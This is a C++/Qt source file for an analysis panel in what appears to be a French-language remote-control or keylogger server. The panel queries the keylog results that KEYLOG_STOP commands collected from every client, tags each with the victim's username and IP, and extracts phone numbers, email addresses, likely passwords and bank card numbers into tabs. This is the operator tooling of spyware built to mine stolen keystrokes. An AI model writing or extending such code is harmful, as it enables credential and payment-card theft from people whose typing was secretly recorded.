#include "AnalysisWidget.hpp"
#include <QSqlQuery>
#include <QSqlError>
#include <QApplication>

/**
 * @brief Constructor - sets up the analysis widget UI
 */
AnalysisWidget::AnalysisWidget(QWidget *parent)
    : QWidget(parent)
    , mainLayout_(nullptr)
    , controlsLayout_(nullptr)
    , analyzeButton_(nullptr)
    , progressBar_(nullptr)
    , statusLabel_(nullptr)
    , resultsTabWidget_(nullptr)
    , phonesListWidget_(nullptr)
    , emailsListWidget_(nullptr)
    , passwordsListWidget_(nullptr)
    , cardsListWidget_(nullptr)
    , analyzer_(nullptr)
    , database_(nullptr)
{
    setupUI();
    
    // Create analysis engine
    analyzer_ = new LPTF_Analysis();
    
    // Set window properties
    setWindowTitle("Analyse globale des données de keylogger");
    resize(800, 600);
}

/**
 * @brief Destructor
 */
AnalysisWidget::~AnalysisWidget()
{
    delete analyzer_;
}

/**
 * @brief Set the database connection
 * @param database Pointer to the database instance
 */
void AnalysisWidget::setDatabase(LPTF_database* database)
{
    database_ = database;
    qDebug() << "[AnalysisWidget] Database connection set for global analysis";
}

/**
 * @brief Setup the user interface
 */
void AnalysisWidget::setupUI()
{
    mainLayout_ = new QVBoxLayout(this);
    
    // Controls section
    controlsLayout_ = new QHBoxLayout();
    
    // Info label
    QLabel* infoLabel = new QLabel("Analyse des données de keylogger de tous les clients:");
    infoLabel->setStyleSheet("font-weight: bold; font-size: 14px;");
    
    // Analyze button
    analyzeButton_ = new QPushButton("Lancer l'analyse globale");
    analyzeButton_->setStyleSheet("QPushButton { background-color: #4CAF50; color: white; font-weight: bold; padding: 8px 16px; border: none; border-radius: 4px; } QPushButton:hover { background-color: #45a049; }");
    
    // Progress bar
    progressBar_ = new QProgressBar();
    progressBar_->setVisible(false);
    
    controlsLayout_->addWidget(infoLabel);
    controlsLayout_->addStretch();
    controlsLayout_->addWidget(analyzeButton_);
    controlsLayout_->addWidget(progressBar_);
    
    // Status label
    statusLabel_ = new QLabel("Cliquez sur 'Lancer l'analyse globale' pour analyser toutes les données de keylogger");
    statusLabel_->setStyleSheet("color: gray; font-style: italic;");
    
    // Results tab widget
    resultsTabWidget_ = new QTabWidget();
    
    // Create tabs for different result types
    phonesListWidget_ = new QListWidget();
    emailsListWidget_ = new QListWidget();
    passwordsListWidget_ = new QListWidget();
    cardsListWidget_ = new QListWidget();
    
    resultsTabWidget_->addTab(phonesListWidget_, "Numéros de téléphone");
    resultsTabWidget_->addTab(emailsListWidget_, "Adresses email");
    resultsTabWidget_->addTab(passwordsListWidget_, "Mots de passe potentiels");
    resultsTabWidget_->addTab(cardsListWidget_, "Numéros de cartes bancaires");
    
    // Add to main layout
    mainLayout_->addLayout(controlsLayout_);
    mainLayout_->addWidget(statusLabel_);
    mainLayout_->addWidget(resultsTabWidget_);
    
    // Connect signals
    connect(analyzeButton_, &QPushButton::clicked,
            this, &AnalysisWidget::startAnalysis);
}

/**
 * @brief Handle analysis completion and display results
 * @param results Map of analysis results by type
 */

/**
 * @brief Start the analysis process for all clients
 */
void AnalysisWidget::startAnalysis()
{
    // Disable button and show progress immediately
    analyzeButton_->setEnabled(false);
    progressBar_->setVisible(true);
    progressBar_->setRange(0, 0); // Indeterminate progress
    statusLabel_->setText("Analyse en cours sur toutes les données de keylogger...");
    statusLabel_->setStyleSheet("color: blue;");
    
    // Force UI update before starting analysis
    QApplication::processEvents();
    
    // Clear previous results immediately
    clearResults();
    QApplication::processEvents();
    
    // Get keylog data for all clients with client information
    QMap<QString, QString> keylogDataWithClients = getKeylogDataWithClients();
    
    if (keylogDataWithClients.isEmpty()) {
        progressBar_->setVisible(false);
        analyzeButton_->setEnabled(true);
        statusLabel_->setText("Aucune donnée de keylogger trouvée dans la base de données");
        statusLabel_->setStyleSheet("color: orange;");
        
        QMessageBox::information(this, "Information", 
            "Aucune donnée de keylogger n'a été trouvée dans la base de données.\n"
            "Assurez-vous que le keylogger a été démarré et arrêté au moins une fois sur les clients.");
        return;
    }
    
    // Update status with data count
    statusLabel_->setText(QString("Analyse de %1 entrées de keylogger en cours...").arg(keylogDataWithClients.size()));
    QApplication::processEvents();
    
    // Perform analysis with client information
    QMap<QString, AnalysisResult> results = analyzer_->analyzeKeylogsWithClients(keylogDataWithClients);
    
    // Hide progress and update status
    progressBar_->setVisible(false);
    analyzeButton_->setEnabled(true);
    
    // Display results
    onAnalysisCompleted(results);
}

/**
 * @brief Get keylog data for all clients from database with client information
 * @return Map of keylog data strings with their corresponding client info
 */
QMap<QString, QString> AnalysisWidget::getKeylogDataWithClients()
{
    QMap<QString, QString> keylogDataWithClients; // keylog_data -> client_info
    
    if (!database_) {
        qDebug() << "[AnalysisWidget] No database connection";
        return keylogDataWithClients;
    }
    
    // Query for ALL KEYLOG_STOP command results from all clients with client info
    QSqlQuery query(database_->database());
    QString sql = "SELECT cr.output, c.username, c.ip "
                  "FROM command_result cr "
                  "JOIN client c ON cr.client_id = c.id "
                  "WHERE cr.command = 'KEYLOG_STOP' "
                  "ORDER BY cr.executed_at DESC";
    
    if (!query.exec(sql)) {
        qDebug() << "[AnalysisWidget] Query failed:" << query.lastError().text();
        return keylogDataWithClients;
    }
    
    while (query.next()) {
        QString output = query.value("output").toString();
        QString username = query.value("username").toString();
        QString ip = query.value("ip").toString();
        
        if (!output.trimmed().isEmpty()) {
            QString clientInfo = username + " (" + ip + ")";
            keylogDataWithClients[output] = clientInfo;
        }
    }
    
    qDebug() << "[AnalysisWidget] Found" << keylogDataWithClients.size() << "keylog entries from all clients";
    return keylogDataWithClients;
}

/**
 * @brief Handle analysis completion and display results
 * @param results Map of analysis results by type
 */
void AnalysisWidget::onAnalysisCompleted(const QMap<QString, AnalysisResult>& results)
{
    qDebug() << "[AnalysisWidget] Analysis completed, processing results...";
    
    // Ensure UI is in proper state
    progressBar_->setVisible(false);
    analyzeButton_->setEnabled(true);
    
    // Display the results
    displayResults(results);
    
    // Update status based on results
    int totalFindings = 0;
    for (const auto& result : results) {
        totalFindings += result.totalCount;
    }
    
    if (totalFindings > 0) {
        statusLabel_->setText(QString("Analyse terminée - %1 éléments trouvés").arg(totalFindings));
        statusLabel_->setStyleSheet("color: green; font-weight: bold;");
        
        // Switch to first tab with results
        for (int i = 0; i < resultsTabWidget_->count(); ++i) {
            QString tabText = resultsTabWidget_->tabText(i);
            if (tabText.contains("(") && !tabText.contains("(0)")) {
                resultsTabWidget_->setCurrentIndex(i);
                break;
            }
        }
    } else {
        statusLabel_->setText("Analyse terminée - Aucun élément sensible détecté");
        statusLabel_->setStyleSheet("color: gray;");
    }
    
    // Force final UI update
    QApplication::processEvents();
    
    qDebug() << "[AnalysisWidget] Analysis completion handling finished. Total findings:" << totalFindings;
}

/**
 * @brief Display analysis results in the tabs
 * @param results Map of analysis results by type
 */
void AnalysisWidget::displayResults(const QMap<QString, AnalysisResult>& results)
{
    qDebug() << "[AnalysisWidget] Displaying results...";
    
    // Display phone numbers
    if (results.contains("phones")) {
        const AnalysisResult& phoneResult = results["phones"];
        qDebug() << "[AnalysisWidget] Adding" << phoneResult.matches.size() << "phone numbers";
        
        for (int i = 0; i < phoneResult.matches.size(); ++i) {
            QString item = phoneResult.matches[i];
            if (i < phoneResult.clientSources.size()) {
                item += " - Client: " + phoneResult.clientSources[i];
            }
            if (i < phoneResult.contexts.size()) {
                item += " - Contexte: " + phoneResult.contexts[i];
            }
            phonesListWidget_->addItem(item);
        }
        
        // Update tab title with count
        int phoneTabIndex = resultsTabWidget_->indexOf(phonesListWidget_);
        resultsTabWidget_->setTabText(phoneTabIndex, 
            QString("Numéros de téléphone (%1)").arg(phoneResult.totalCount));
        
        phonesListWidget_->update();
    }
    
    // Display email addresses
    if (results.contains("emails")) {
        const AnalysisResult& emailResult = results["emails"];
        qDebug() << "[AnalysisWidget] Adding" << emailResult.matches.size() << "emails";
        
        for (int i = 0; i < emailResult.matches.size(); ++i) {
            QString item = emailResult.matches[i];
            if (i < emailResult.clientSources.size()) {
                item += " - Client: " + emailResult.clientSources[i];
            }
            if (i < emailResult.contexts.size()) {
                item += " - Contexte: " + emailResult.contexts[i];
            }
            emailsListWidget_->addItem(item);
        }
        
        // Update tab title with count
        int emailTabIndex = resultsTabWidget_->indexOf(emailsListWidget_);
        resultsTabWidget_->setTabText(emailTabIndex,
            QString("Adresses email (%1)").arg(emailResult.totalCount));
        
        emailsListWidget_->update();
    }
    
    // Display potential passwords
    if (results.contains("passwords")) {
        const AnalysisResult& passwordResult = results["passwords"];
        qDebug() << "[AnalysisWidget] Adding" << passwordResult.matches.size() << "passwords";
        
        for (int i = 0; i < passwordResult.matches.size(); ++i) {
            QString item = "*******";
            if (i < passwordResult.clientSources.size()) {
                item += " - Client: " + passwordResult.clientSources[i];
            }
            if (i < passwordResult.contexts.size()) {
                item += " - Contexte: " + passwordResult.contexts[i];
            }
            passwordsListWidget_->addItem(item);
        }
        
        // Update tab title with count
        int passwordTabIndex = resultsTabWidget_->indexOf(passwordsListWidget_);
        resultsTabWidget_->setTabText(passwordTabIndex,
            QString("Mots de passe potentiels (%1)").arg(passwordResult.totalCount));
        
        passwordsListWidget_->update();
    }
    
    // Display credit card numbers
    if (results.contains("cards")) {
        const AnalysisResult& cardResult = results["cards"];
        qDebug() << "[AnalysisWidget] Adding" << cardResult.matches.size() << "credit cards";
        
        for (int i = 0; i < cardResult.matches.size(); ++i) {
            QString item = cardResult.matches[i];
            if (i < cardResult.clientSources.size()) {
                item += " - Client: " + cardResult.clientSources[i];
            }
            if (i < cardResult.contexts.size()) {
                item += " - Contexte: " + cardResult.contexts[i];
            }
            cardsListWidget_->addItem(item);
        }
        
        // Update tab title with count
        int cardTabIndex = resultsTabWidget_->indexOf(cardsListWidget_);
        resultsTabWidget_->setTabText(cardTabIndex,
            QString("Numéros de cartes bancaires (%1)").arg(cardResult.totalCount));
        
        cardsListWidget_->update();
    }
    
    // Force repaint of the entire widget
    this->update();
    resultsTabWidget_->update();
    
    qDebug() << "[AnalysisWidget] Results display completed";
}

/**
 * @brief Clear all results from the display
 */
void AnalysisWidget::clearResults()
{
    // Clear all list widgets
    phonesListWidget_->clear();
    emailsListWidget_->clear();
    passwordsListWidget_->clear();
    cardsListWidget_->clear();
    
    // Reset tab titles to original state
    resultsTabWidget_->setTabText(0, "Numéros de téléphone");
    resultsTabWidget_->setTabText(1, "Adresses email");
    resultsTabWidget_->setTabText(2, "Mots de passe potentiels");
    resultsTabWidget_->setTabText(3, "Numéros de cartes bancaires");
    
    // Force widget updates
    phonesListWidget_->update();
    emailsListWidget_->update();
    passwordsListWidget_->update();
    cardsListWidget_->update();
    resultsTabWidget_->update();
    
    qDebug() << "[AnalysisWidget] Results cleared and UI updated";
}